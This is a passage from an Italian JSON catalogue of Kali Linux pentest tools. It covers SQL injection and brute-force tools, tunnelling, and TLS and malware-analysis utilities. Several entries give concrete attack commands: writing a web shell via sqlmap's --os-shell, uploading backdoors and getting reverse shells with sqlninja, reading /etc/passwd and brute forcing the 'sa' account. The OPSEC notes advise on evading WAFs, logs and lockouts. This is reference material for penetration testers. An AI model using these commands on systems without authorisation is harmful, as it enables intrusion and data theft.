dictionary su wordlist estese. Il numero di thread e configurabile per bilanciare velocita e rischio di saturazione delle connessioni disponibili sul server target, che tipicamente ha un limite di connessioni concorrenti.</p><p><strong>Supporto Multi-Istanza:</strong> SQLDict gestisce sia istanze SQL Server default (porta 1433) che named instances raggiungibili tramite il SQL Browser Service sulla porta 1434. Questa capacita e importante in ambienti enterprise dove spesso coesistono multiple istanze SQL Server sullo stesso host, ciascuna potenzialmente con configurazioni di sicurezza diverse.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>SQLDict e un tool da riga di comando che richiede come minimo l'indirizzo del server target, un username o una lista di utenti, e una wordlist di password. E consigliabile iniziare con l'account sa, che e l'account predefinito di SQL Server e spesso il bersaglio piu redditizio.</p><pre><code># Brute force dell'account sa\nsqldict 192.168.1.100 sa passwords.txt\n\n# Specificare porta non standard\nsqldict 192.168.1.100:1434 sa passwords.txt\n\n# Test con lista di utenti e password\nsqldict 192.168.1.100 users.txt passwords.txt\n\n# Aumentare i thread paralleli\nsqldict 192.168.1.100 sa passwords.txt -t 10\n\n# Named instance specifica\nsqldict 192.168.1.100\\SQLEXPRESS sa passwords.txt</code></pre><p>Prima di eseguire l'attacco, e utile verificare la raggiungibilita dell'istanza SQL Server con nmap o un client SQL. In ambienti con lockout policy attive sull'account sa, procedere con cautela limitando il rate dei tentativi. Verificare inoltre se l'autenticazione SQL e abilitata: molti server in produzione utilizzano esclusivamente Windows Authentication, rendendo il tool inefficace.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Durante un <strong>internal penetration test</strong>, SQLDict viene impiegato per testare istanze SQL Server scoperte durante la fase di network scanning, verificando se account predefiniti come sa hanno password deboli o invariate rispetto ai default. Nel contesto di un <strong>database security audit</strong>, lo strumento aiuta a valutare l'enforcement delle password policy sugli account SQL, identificando quelli che non rispettano i requisiti di complessita aziendali. Per attivita di <strong>post-exploitation</strong>, quando sono state ottenute credenziali parziali o wordlist derivate da dump precedenti, SQLDict permette di testare rapidamente queste credenziali contro tutte le istanze SQL Server nella rete per espandere l'accesso.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> SQL Server registra tutti i tentativi di login falliti nel SQL Server Error Log e nell'Event Log di Windows (Event ID 18456). Soluzioni di monitoraggio database come SQL Audit o trigger di login possono generare alert immediati per tentativi di brute force. Pattern di connessioni rapide e fallite dallo stesso IP sono facilmente identificabili.</p><p><strong>Impatto operativo:</strong> SQL Server supporta il lockout degli account dopo un numero configurabile di tentativi falliti quando integrato con Windows Authentication. Anche senza lockout, un volume elevato di connessioni fallite puo saturare le risorse del server, impattando le prestazioni delle applicazioni che dipendono dal database. In ambienti con monitoring attivo, l'attacco sara quasi certamente rilevato.</p><p><strong>Mitigazioni:</strong> Limitare il rate dei tentativi a pochi al minuto per evitare lockout e ridurre la visibilita nei log. Concentrarsi su un numero ristretto di password ad alta probabilita piuttosto che wordlist massive. Verificare preventivamente la configurazione di autenticazione del server per evitare tentativi inutili su server con sola Windows Authentication. Utilizzare connessioni da IP interni alla rete per evitare blocchi firewall.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Web",
      "Injection",
      "SQLi"
    ],
    "notes": null
  },
  {
    "id": "sqlmap",
    "name": "sqlmap",
    "version": "1.9.8",
    "icon": "../app/icons/sqlmap-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/sqlmap/",
    "desc": "Tool automatico per SQL injection: detection, exploitation, data extraction e takeover.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>SQLMap</strong> è lo strumento di riferimento per detection e exploitation automatica di SQL injection. Supporta tutti i DBMS principali, tecniche di injection multiple e funzionalità avanzate come OS shell e database takeover.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Auto-Detection:</strong> identifica tipo SQLi e DBMS automaticamente</p><p><strong>Full DBMS Support:</strong> MySQL, PostgreSQL, MSSQL, Oracle, SQLite</p><p><strong>Data Extraction:</strong> dump database, tabelle, colonne</p><p><strong>OS Access:</strong> shell, file read/write su sistemi vulnerabili</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Enumeration completa con risk e level alti\nsqlmap -u \"http://target.com/page?id=1\" --dbs --risk=3 --level=5 --batch\n\n# Da Burp request file con cookie e proxy\nsqlmap -r request.txt --batch --proxy=http://127.0.0.1:8080 \\\n  --cookie=\"PHPSESSID=abc123\" --random-agent\n\n# Dump specifico con evasione WAF avanzata\nsqlmap -u \"http://target.com/page?id=1\" -D mydb -T users --dump \\\n  --tamper=\"between,randomcase,space2comment\" --delay=2\n\n# Second-order injection\nsqlmap -u \"http://target.com/view\" --second-url=\"http://target.com/result\" \\\n  --data=\"input=*\" --technique=U\n\n# OS shell con tecniche alternative\nsqlmap -u \"http://target.com/page?id=1\" --os-shell --technique=E \\\n  --file-write=/tmp/shell.php --file-dest=/var/www/html/shell.php\n\n# Time-based blind con threads ottimizzati\nsqlmap -u \"http://target.com/page?id=1\" --technique=T --time-sec=3 --threads=10\n\n# POST JSON API con header custom\nsqlmap -u \"http://api.target.com/search\" --data='{\"query\":\"*\"}' \\\n  --method=POST -H \"Content-Type: application/json\" -H \"Authorization: Bearer xxx\"</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>web pentest</strong>, testa e sfrutta SQL injection.</p><p>Per <strong>data extraction</strong>, recupera contenuti database.</p><p>Per <strong>privilege escalation</strong>, ottiene shell o accesso filesystem.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rumore:</strong> genera molte richieste anomale.</p><p><strong>WAF:</strong> facilmente bloccato, usare tamper scripts.</p><p><strong>Logging:</strong> tutte le query loggabili lato server.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "02_Exploitation",
      "Web",
      "Injection",
      "SQLi"
    ],
    "notes": null
  },
  {
    "id": "sqlmc",
    "name": "sqlmc",
    "version": "1.1.0",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/sqlmc/",
    "desc": "Crawla sito web cercando parametri SQL injectable e testa automaticamente per SQLi.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>SQLMC</strong> (SQL Mass Checker) e uno scanner automatizzato che combina web crawling con testing per SQL injection, progettato per identificare rapidamente parametri vulnerabili in applicazioni web di grandi dimensioni. Lo strumento esplora sistematicamente un sito web seguendo i link interni, raccogliendo tutti gli URL con parametri GET e POST, e testa ciascun parametro per vulnerabilita di tipo SQL injection utilizzando una serie di payload predefiniti. SQLMC e particolarmente efficace come strumento di primo passaggio durante assessment di applicazioni web complesse con centinaia di pagine e form, dove un'analisi manuale richiederebbe tempo eccessivo. Il tool genera report dettagliati che identificano i parametri potenzialmente vulnerabili, permettendo al pentester di concentrare l'analisi manuale approfondita solo sui punti piu promettenti.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Web Crawling Intelligente:</strong> SQLMC integra un crawler che esplora il sito target seguendo link interni fino a una profondita configurabile. Il crawler identifica form HTML, parametri URL, endpoint AJAX e pattern di routing comuni, costruendo una mappa completa dei punti di input dell'applicazione. La profondita di crawling e configurabile per bilanciare copertura e tempo di scansione.</p><p><strong>SQL Injection Testing Automatico:</strong> Per ogni parametro scoperto, lo strumento inietta una serie di payload diagnostici progettati per provocare errori SQL rivelatori o comportamenti anomali nell'applicazione. I payload coprono diverse tecniche di injection tra cui error-based, boolean-based e time-based, permettendo di identificare vulnerabilita anche quando i messaggi di errore sono soppressi. Il sistema analizza le risposte per pattern indicativi di vulnerabilita.</p><p><strong>Reporting e Filtraggio Risultati:</strong> SQLMC genera report strutturati che elencano tutti i parametri testati con il relativo stato di vulnerabilita. I risultati possono essere esportati in formato testo per integrazione con altri strumenti o per documentazione. Il tool distingue tra risultati confermati e potenziali false positive, indicando il livello di confidenza per ogni finding.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>SQLMC e uno strumento da riga di comando scritto in Python. Richiede come minimo l'URL del sito target. I parametri opzionali permettono di controllare la profondita del crawling, il numero di thread e il formato di output.</p><pre><code># Scansione base di un sito web\nsqlmc -u http://target.com/\n\n# Impostare profondita di crawling a 3 livelli\nsqlmc -u http://target.com/ -d 3\n\n# Aumentare i thread per scansioni piu veloci\nsqlmc -u http://target.com/ -t 10\n\n# Salvare risultati su file\nsqlmc -u http://target.com/ -o results.txt\n\n# Scansione con depth e output combinati\nsqlmc -u http://target.com/ -d 5 -t 15 -o full_scan.txt</code></pre><p>I risultati richiedono sempre verifica manuale: SQLMC identifica potenziali punti di injection ma non li sfrutta completamente. Per exploitation approfondita dei punti trovati, utilizzare strumenti dedicati come sqlmap specificando gli URL e i parametri vulnerabili identificati da SQLMC. Il crawling puo richiedere tempo significativo su siti di grandi dimensioni; utilizzare il parametro di profondita per limitare lo scope iniziale.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Durante attivita di <strong>vulnerability discovery</strong> su applicazioni web enterprise, SQLMC viene utilizzato come strumento di primo passaggio per identificare rapidamente i parametri piu promettenti da testare manualmente, riducendo drasticamente il tempo necessario per la fase di discovery. In contesti di <strong>bug bounty</strong>, il tool permette di scansionare velocemente ampi scope alla ricerca di vulnerabilita SQL injection evidenti che rappresentano spesso low-hanging fruit ad alto impatto. Per <strong>security assessment periodici</strong>, SQLMC puo essere integrato in pipeline automatizzate per monitorare continuamente le applicazioni web alla ricerca di nuovi parametri vulnerabili introdotti durante gli aggiornamenti del codice.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Il crawling genera un volume significativo di richieste HTTP che sara facilmente visibile nei log del web server e nelle dashboard di monitoraggio. I payload di SQL injection contengono pattern caratteristici (apici singoli, UNION SELECT, SLEEP, WAITFOR) che vengono immediatamente identificati e bloccati da Web Application Firewall (WAF) come ModSecurity, Cloudflare e AWS WAF. I pattern di crawling sistematico sono distinguibili dal traffico utente normale.</p><p><strong>Impatto operativo:</strong> Un crawling aggressivo con molti thread puo impattare le prestazioni dell'applicazione target, specialmente se le pagine coinvolgono query database pesanti. I payload di injection possono in rari casi causare errori applicativi visibili agli utenti legittimi o corrompere dati se i parametri testati corrispondono a operazioni di scrittura (INSERT, UPDATE). Il WAF potrebbe bloccare l'IP sorgente, impedendo ulteriori test.</p><p><strong>Mitigazioni:</strong> Limitare il numero di thread e aggiungere delay tra le richieste per ridurre l'impatto sulle prestazioni del server. Eseguire le scansioni durante finestre di manutenzione o in orari di basso traffico. Utilizzare user agent realistici per ridurre la visibilita. Verificare con il cliente la presenza di WAF e, se possibile, richiedere il whitelisting dell'IP di testing per ottenere risultati piu accurati senza rischio di blocco.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Web",
      "Injection",
      "SQLi"
    ],
    "notes": null
  },
  {
    "id": "sqlninja",
    "name": "sqlninja",
    "version": "0.2.6",
    "icon": "../app/icons/sqlninja-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/sqlninja/",
    "desc": "Exploita SQL injection su MSSQL per shell, privilege escalation e data exfiltration.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>SQLNinja</strong> e uno strumento avanzato per l'exploitation di vulnerabilita SQL injection specificamente su Microsoft SQL Server, con un forte focus sulle attivita di post-exploitation. A differenza di tool generici come sqlmap, SQLNinja e progettato per andare oltre la semplice estrazione dati, offrendo capacita di ottenere shell interattive, caricare backdoor, escalare privilegi e exfiltrare dati attraverso canali covert come DNS tunneling. Lo strumento opera in modalita modulari progressive: dal fingerprinting iniziale del database, attraverso la riattivazione di xp_cmdshell, fino all'upload di payload Metasploit e all'ottenimento di accesso completo al sistema operativo sottostante. SQLNinja e particolarmente efficace in scenari dove l'SQL injection e l'unico punto di ingresso disponibile e l'obiettivo e ottenere command execution piuttosto che limitarsi al dump dei dati.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Shell Upload e Command Execution:</strong> SQLNinja puo riattivare la stored procedure xp_cmdshell (se disabilitata) e utilizzarla per eseguire comandi sul sistema operativo. Inoltre supporta l'upload di payload binari tramite tecniche di encoding che scompongono l'eseguibile in comandi SQL, ricostruendolo sul filesystem del server. Questo permette di caricare backdoor Metasploit complete senza necessita di accesso diretto al filesystem.</p><p><strong>Privilege Escalation su SQL Server:</strong> Lo strumento implementa tecniche per escalare da un utente database con privilegi limitati fino al ruolo sysadmin. Supporta brute force della password sa, token impersonation e sfruttamento di misconfigurazioni nei permessi del database per elevare i privilegi. Una volta ottenuto sysadmin, l'attaccante ha controllo completo sull'istanza SQL e puo eseguire comandi OS tramite xp_cmdshell.</p><p><strong>Exfiltration via DNS Tunneling:</strong> Per scenari dove il traffico HTTP e fortemente filtrato, SQLNinja supporta l'estrazione dati tramite query DNS. Il server SQL viene istruito a risolvere nomi DNS che contengono i dati codificati, e un server DNS controllato dall'attaccante raccoglie le informazioni. Questa tecnica bypassa la maggior parte dei firewall che permettono il traffico DNS in uscita.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>SQLNinja utilizza un file di configurazione che specifica i parametri dell'injection (URL, parametro vulnerabile, metodo HTTP). Lo strumento opera in modalita incrementali, ciascuna costruita sui risultati della precedente.</p><pre><code># Fingerprint del database target\nsqlninja -m fingerprint\n\n# Brute force della password sa\nsqlninja -m bruteforce -w wordlist.txt\n\n# Riattivazione xp_cmdshell e test comandi\nsqlninja -m test\n\n# Upload di una backdoor sul server\nsqlninja -m upload -p payload.exe\n\n# Scansione reverse per trovare porte aperte in uscita\nsqlninja -m backscan\n\n# Tentativo di escalation a sysadmin\nsqlninja -m escalation\n\n# Ottenere reverse shell via Metasploit\nsqlninja -m metasploit</code></pre><p>Il file di configurazione sqlninja.conf deve essere preparato manualmente con i dettagli dell'injection point. E fondamentale che l'SQL injection sia gia confermata prima di utilizzare SQLNinja, poiche il tool non include funzionalita di discovery. La modalita backscan e particolarmente utile per identificare quali porte TCP sono permesse in uscita dal firewall, permettendo di configurare correttamente il listener per la reverse shell.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In scenari di <strong>exploitation avanzata MSSQL</strong>, SQLNinja viene utilizzato quando una SQL injection su SQL Server e stata identificata e l'obiettivo e ottenere command execution completa sul sistema operativo, passando dal livello database al livello OS tramite xp_cmdshell e upload di payload. Per <strong>data exfiltration in ambienti restrittivi</strong>, quando firewall e proxy bloccano i canali di uscita tradizionali, il modulo DNS tunneling di SQLNinja permette di estrarre dati sensibili attraverso un canale che raramente viene filtrato. Durante <strong>privilege escalation su SQL Server</strong>, lo strumento aiuta a passare da un utente con privilegi limitati a sysadmin, spesso tramite brute force della password sa o sfruttamento di misconfigurazioni nei ruoli del database.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> La riattivazione di xp_cmdshell genera eventi di audit specifici in SQL Server (sp_configure) che sono comunemente monitorati dalle soluzioni SIEM. L'esecuzione di comandi OS tramite xp_cmdshell produce eventi nel Security Event Log di Windows. I payload Metasploit uploadati sono soggetti a rilevamento da parte di soluzioni antivirus e EDR. Le query DNS anomale generate dal modulo di exfiltration possono essere rilevate da soluzioni DNS security come Cisco Umbrella.</p><p><strong>Impatto operativo:</strong> Le operazioni di SQLNinja sono intrinsecamente distruttive dal punto di vista OPSEC: la riattivazione di xp_cmdshell modifica la configurazione del server, l'upload di file lascia artefatti sul filesystem, e l'escalation di privilegi genera eventi di audit ad alta priorita. In ambienti con monitoring maturo, queste attivita saranno rilevate quasi immediatamente.</p><p><strong>Mitigazioni:</strong> Verificare preventivamente il livello di monitoraggio del SQL Server prima di procedere con operazioni invasive. Utilizzare il modulo backscan per identificare porte di uscita permesse prima di tentare reverse shell. Considerare l'uso di tecniche di offuscamento per i payload uploadati. Dopo il completamento dell'assessment, riportare xp_cmdshell allo stato originale e rimuovere tutti i file caricati sul server.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Web",
      "Injection",
      "SQLi"
    ],
    "notes": null
  },
  {
    "id": "sqlsus",
    "name": "sqlsus",
    "version": "0.7.2",
    "icon": "../app/icons/sqlsus-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/sqlsus/",
    "desc": "Injection tool MySQL con interfaccia command-line per dump database e file read.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>SQLSus</strong> e uno strumento di exploitation per SQL injection specializzato in database MySQL e MariaDB, che offre un'interfaccia a riga di comando interattiva simile al client MySQL nativo. Lo strumento automatizza le tecniche di injection UNION-based e blind per permettere l'esplorazione completa del database, il dump di tabelle e la lettura di file dal filesystem del server tramite la funzione LOAD_FILE(). SQLSus gestisce automaticamente il rilevamento del numero di colonne per UNION injection, l'identificazione delle colonne visibili nell'output e l'encoding dei payload per bypassare filtri basilari. L'interfaccia interattiva permette di navigare tra database, tabelle e colonne con comandi intuitivi, rendendo il processo di exploitation simile a una sessione di database administration piuttosto che a un attacco manuale. Lo strumento mantiene una cache locale dei dati gia estratti, evitando query ridondanti e velocizzando le sessioni di exploitation prolungate.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Interfaccia Interattiva MySQL-like:</strong> SQLSus presenta un'interfaccia a riga di comando che richiama il client MySQL, con comandi come 'get databases', 'get tables', 'get columns' che traducono automaticamente le richieste in query SQL injection. Questa astrazione permette anche a operatori meno esperti di navigare e estrarre dati dal database target senza dover costruire manualmente i payload di injection. La sessione mantiene il contesto corrente (database e tabella selezionati) tra i comandi.</p><p><strong>Lettura File dal Filesystem:</strong> Tramite la funzione MySQL LOAD_FILE(), SQLSus puo leggere file dal filesystem del server database quando l'utente MySQL corrente ha il privilegio FILE. Questa capacita permette di accedere a file di configurazione sensibili come /etc/passwd, /etc/shadow (con permessi sufficienti), file di configurazione delle applicazioni web (wp-config.php, config.php) e chiavi SSH, espandendo significativamente l'impatto dell'exploitation oltre il solo database.</p><p><strong>UNION-based Auto-Detection:</strong> Lo strumento automatizza il processo di rilevamento del numero di colonne nella query originale, necessario per costruire payload UNION SELECT funzionanti. Testa sistematicamente incrementando il numero di colonne fino a ottenere una risposta valida, identifica quali colonne sono visualizzate nell'output della pagina e seleziona automaticamente quelle piu adatte per l'estrazione dati. Supporta inoltre tecniche di encoding per bypassare filtri su keyword come UNION e SELECT.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>SQLSus utilizza file di configurazione per memorizzare i parametri della sessione di exploitation. Il primo passo e generare un file di configurazione, quindi personalizzarlo con i dettagli dell'injection point prima di avviare la sessione interattiva.</p><pre><code># Generare file di configurazione template\nsqlsus -g session.cfg\n\n# Editare session.cfg con URL e parametro vulnerabile\n# Avviare la sessione interattiva\nsqlsus session.cfg\n\n# Comandi nella shell interattiva:\nstart                    # inizia injection e auto-detection\nget databases            # lista tutti i database\nset database target_db   # seleziona database\nget tables               # lista tabelle del database corrente\nset table users          # seleziona tabella\nget columns              # lista colonne della tabella\nget data username,password  # estrae dati dalle colonne\nget file /etc/passwd     # legge file dal filesystem</code></pre><p>Il file di configurazione session.cfg deve essere modificato manualmente per specificare l'URL vulnerabile, il parametro di injection, il metodo HTTP (GET/POST) e il tipo di injection. SQLSus supporta anche l'uso di cookie per sessioni autenticate e header personalizzati. I dati estratti vengono salvati in un database SQLite locale per consultazione offline e per evitare query ripetute nelle sessioni successive.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>exploitation approfondita di MySQL</strong>, SQLSus viene utilizzato quando una SQL injection su MySQL e stata confermata e l'obiettivo e estrarre sistematicamente dati dal database, navigando tra schemi, tabelle e record con un'interfaccia interattiva che semplifica il processo rispetto alla costruzione manuale dei payload. In scenari di <strong>file read tramite SQLi</strong>, lo strumento permette di accedere a file di configurazione sul server (come wp-config.php con credenziali database, o file .htpasswd) che possono rivelare ulteriori credenziali o informazioni sensibili. Durante <strong>data extraction mirata</strong>, la cache locale e la possibilita di selezionare colonne specifiche permettono di estrarre chirurgicamente solo i dati di interesse come tabelle utenti, credenziali o informazioni sensibili, riducendo il volume di traffico generato.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Le query UNION SELECT generano pattern molto riconoscibili nei log del web server e del database, facilmente identificabili da WAF e soluzioni IDS/IPS. I tentativi di LOAD_FILE() producono eventi nei log MySQL general query log e sono monitorati da soluzioni di database activity monitoring. Pattern di accesso sequenziale a INFORMATION_SCHEMA sono indicatori comuni di exploitation automatizzata.</p><p><strong>Impatto operativo:</strong> L'estrazione di grandi volumi di dati tramite UNION injection genera traffico HTTP anomalo sia in termini di volume che di dimensione delle risposte. La funzione LOAD_FILE() richiede il privilegio FILE che nelle installazioni moderne di MySQL e spesso disabilitato o limitato tramite secure_file_priv. Le sessioni di exploitation prolungate aumentano la probabilita di rilevamento e la quantita di evidenze nei log.</p><p><strong>Mitigazioni:</strong> Limitare le sessioni di exploitation a finestre temporali brevi e mirate, estraendo solo i dati strettamente necessari. Utilizzare encoding e offuscamento dei payload per ridurre la probabilita di detection da parte di WAF con rule-set basati su pattern matching. Verificare preventivamente i permessi dell'utente MySQL corrente prima di tentare operazioni LOAD_FILE(). Considerare l'uso di time-based blind injection come fallback quando i payload UNION vengono bloccati.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Web",
      "Injection",
      "SQLi"
    ],
    "notes": null
  },
  {
    "id": "ssdeep",
    "name": "ssdeep",
    "version": "2.14.1",
    "icon": "../app/icons/ssdeep-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/ssdeep/",
    "desc": "Calcola fuzzy hash per identificare file simili in analisi malware e forensics.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>ssdeep</strong> è uno strumento per calcolare fuzzy hash (context-triggered piecewise hashing). A differenza di hash crittografici, identifica file simili anche con modifiche minori, utile per clustering malware.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Fuzzy Hashing:</strong> CTPH per similarity detection</p><p><strong>Comparison:</strong> calcola percentuale similarità tra file</p><p><strong>Recursive:</strong> processa directory ricorsivamente</p><p><strong>Cluster Analysis:</strong> raggruppa file simili</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Genera database hash da samples noti\nssdeep -b -r /malware/known_families/ &gt; malware_signatures.ssdeep\n\n# Confronta sample sospetto contro database\nssdeep -m malware_signatures.ssdeep -t 70 suspect.exe  # threshold 70%\n\n# Clustering malware: trova varianti simili\nssdeep -p -r /samples/ | sort -t: -k3 -nr | head -50  # top 50 matches\n\n# Pipeline con VirusTotal hash per triage\nfor f in /incoming/*.exe; do\n  ssdeep \"$f\" &gt;&gt; hashes.txt\n  sha256=$(sha256sum \"$f\" | cut -d' ' -f1)\n  curl -s \"https://www.virustotal.com/api/v3/files/$sha256\" -H \"x-apikey: KEY\"\ndone\n\n# Confronto cross-directory per similarity\nssdeep -l -r /samples/family_a/ &gt; family_a.ssdeep\nssdeep -x family_a.ssdeep -r /samples/unknown/\n\n# Output CSV per analisi in Jupyter/Pandas\nssdeep -c -r /samples/ &gt; similarity_matrix.csv</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>malware analysis</strong>, raggruppa varianti della stessa famiglia.</p><p>Per <strong>forensics</strong>, trova file modificati leggermente.</p><p>Per <strong>threat intel</strong>, identifica relazioni tra samples.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>False Positives:</strong> similarità non implica stesso malware.</p><p><strong>Performance:</strong> confronto O(n²) su grandi dataset.</p><p><strong>Limitations:</strong> packed/encrypted files possono dare risultati errati.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "05_Forensics",
      "Malware_Analysis"
    ],
    "notes": null
  },
  {
    "id": "sshuttle",
    "name": "sshuttle",
    "version": "1.3.2",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/sshuttle/",
    "desc": "VPN over SSH trasparente: tunneling completo senza bisogno di configurazione server.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>sshuttle</strong> è una VPN trasparente over SSH che non richiede configurazione server. Usa Python e iptables per creare tunnel che instradano tutto il traffico attraverso la connessione SSH.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Zero Config Server:</strong> richiede solo SSH e Python sul target</p><p><strong>Transparent Proxy:</strong> tutto il traffico passa per il tunnel</p><p><strong>Subnet Routing:</strong> instrada subnet specifiche</p><p><strong>DNS Forwarding:</strong> risolve DNS attraverso il tunnel</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Tunnel per subnet interna via jump host\nsshuttle -r user@jumphost 10.0.0.0/8 172.16.0.0/12 --dns\n\n# Full tunnel con esclusione host locale\nsshuttle -r user@jumphost 0/0 -x jumphost_ip/32 --python=/usr/bin/python3\n\n# Chain attraverso bastion con ProxyJump\nsshuttle -r user@internal -e 'ssh -J user@bastion' 192.168.0.0/16\n\n# Background daemon con autorestart\nsshuttle --daemon --pidfile=/tmp/sshuttle.pid -r user@jumphost 10.0.0.0/8 &amp;&amp; \\\n  echo \"Tunnel running, nmap interno possibile\"\n\n# Con chiave SSH e porta non standard\nsshuttle -r user@jumphost:2222 10.0.0.0/8 -e 'ssh -i ~/.ssh/pentest_key -o StrictHostKeyChecking=no'\n\n# Multipli subnet per pentest completo\nsshuttle -r root@pwned 10.0.0.0/8 172.16.0.0/12 192.168.0.0/16 --dns -v\n\n# Combine con proxychains per tool non supportati\nsshuttle -r user@jumphost 10.0.0.0/8 &amp;&amp; nmap -sT -Pn 10.0.0.0/24</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>pivoting</strong>, accede a reti interne via jump host.</p><p>Per <strong>pentest</strong>, raggiungi subnet non direttamente accessibili.</p><p>Per <strong>bypass firewall</strong>, tunnel attraverso SSH consentito.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>SSH Logs:</strong> connessione SSH visibile nei log.</p><p><strong>Traffic:</strong> tutto il traffico passa per l'host SSH.</p><p><strong>Permissions:</strong> richiede root locale per iptables.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "03_Post_Exploitation",
      "Pivoting"
    ],
    "notes": null
  },
  {
    "id": "ssldump",
    "name": "ssldump",
    "version": "1.9",
    "icon": "../app/icons/ssldump-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/ssldump/",
    "desc": "Analizza traffico SSL/TLS decodificando handshake e mostrando cipher negoziati.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>ssldump</strong> e un analizzatore di protocollo di rete specializzato nella decodifica del traffico SSL/TLS, funzionando come un equivalente di tcpdump specifico per le comunicazioni cifrate. Lo strumento intercetta e decodifica le fasi dell'handshake TLS mostrando in dettaglio i messaggi ClientHello, ServerHello, lo scambio di chiavi, la negoziazione delle cipher suite e i certificati presentati dal server. Quando viene fornita la chiave privata del server, ssldump e in grado di decifrare completamente il traffico applicativo sottostante, permettendo l'analisi del contenuto HTTP e di altri protocolli trasportati su TLS. Lo strumento supporta sia la cattura live su interfacce di rete che l'analisi di file pcap preregistrati, rendendolo versatile sia per il debugging in tempo reale che per l'analisi forense. ssldump e particolarmente prezioso per diagnosticare problemi di configurazione TLS, verificare che le cipher suite negoziate soddisfino i requisiti di sicurezza e per ricostruire sessioni cifrate durante indagini forensi quando la chiave privata e disponibile.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Decodifica Handshake TLS Completa:</strong> ssldump analizza e visualizza in modo leggibile ogni fase del protocollo TLS handshake, inclusi i messaggi ClientHello con le cipher suite proposte, ServerHello con la cipher selezionata, lo scambio certificati, il key exchange e il Finished message. Questa analisi dettagliata permette di identificare problemi di compatibilita tra client e server, verificare l'ordine di preferenza delle cipher suite e diagnosticare fallimenti di handshake che altrimenti apparirebbero come connessioni interrotte senza spiegazione.</p><p><strong>Decifrazione Traffico con Chiave Privata:</strong> Quando viene fornita la chiave privata del server in formato PEM, ssldump puo decifrare il traffico applicativo delle sessioni che utilizzano scambio chiavi RSA statico. Questa capacita trasforma lo strumento da semplice analizzatore di handshake a un vero e proprio ispettore di contenuti, mostrando il traffico HTTP, le intestazioni e i body delle richieste e risposte che transitano sul canale cifrato. Questa funzionalita e essenziale per analisi forensi e debugging applicativo.</p><p><strong>Analisi Certificati e Cipher Suite:</strong> Lo strumento estrae e visualizza i dettagli completi dei certificati scambiati durante l'handshake, inclusi subject, issuer, validita, algoritmo di firma e estensioni. Mostra inoltre la cipher suite negoziata con dettagli su algoritmo di scambio chiavi, cifratura simmetrica e funzione hash, permettendo una valutazione immediata della robustezza crittografica della connessione.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>ssldump opera in modo simile a tcpdump ma con capacita di decodifica SSL/TLS. Puo catturare traffico live o analizzare file pcap esistenti. La cattura live richiede privilegi root per accedere all'interfaccia di rete in modalita promiscua.</p><pre><code># Cattura e analisi live su interfaccia di rete\nsudo ssldump -i eth0 port 443\n\n# Analisi da file pcap esistente\nssldump -r capture.pcap\n\n# Decifrazione traffico con chiave privata del server\nssldump -r capture.pcap -k server.key -d\n\n# Output dettagliato con application data\nssldump -i eth0 -A -d port 443\n\n# Mostrare solo informazioni di handshake\nssldump -i eth0 -H port 443\n\n# Filtrare per host specifico\nssldump -i eth0 host 192.168.1.100 and port 